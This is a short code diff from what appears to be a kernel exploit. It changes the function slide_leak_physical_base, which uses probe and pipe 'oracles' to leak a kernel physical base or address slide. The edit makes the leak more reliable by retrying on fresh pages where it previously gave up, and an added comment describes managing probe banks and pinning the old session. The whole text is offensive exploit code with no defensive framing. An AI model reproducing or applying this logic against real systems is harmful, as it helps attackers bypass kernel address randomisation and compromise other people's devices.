@@ -1163,15 +1163,24 @@ static int slide_leak_physical_base(void) {
     if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
       pr_warning("p0 probe slot trigger failed fresh=%d/%d\n",
                  fresh_attempt, fresh_page_attempts);
+      /*
+       * The probe trigger walk consumed the probe bank even though no
+       * write window was observed; the bank cannot be re-initialized
+       * in kernel memory, so never re-run a trigger on the same slot.
+       * Retry the whole fresh page instead: a new page carries fresh
+       * gate/probe banks, and the keeper pins the old session.
+       */
       slide_restore_physical_oracle();
-      return 0;
+      fresh_attempt++;
+      continue;
     }
     uintptr_t offset = scan_p0_pipe_oracle();
     if (offset == (uintptr_t)-1) {
       pr_warning("p0 probe scan failed fresh=%d/%d\n",
                  fresh_attempt, fresh_page_attempts);
       slide_restore_physical_oracle();
-      return 0;
+      fresh_attempt++;
+      continue;
     }
 #if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
     APP_P0_FINGERPRINT_INVERSE_SLIDE
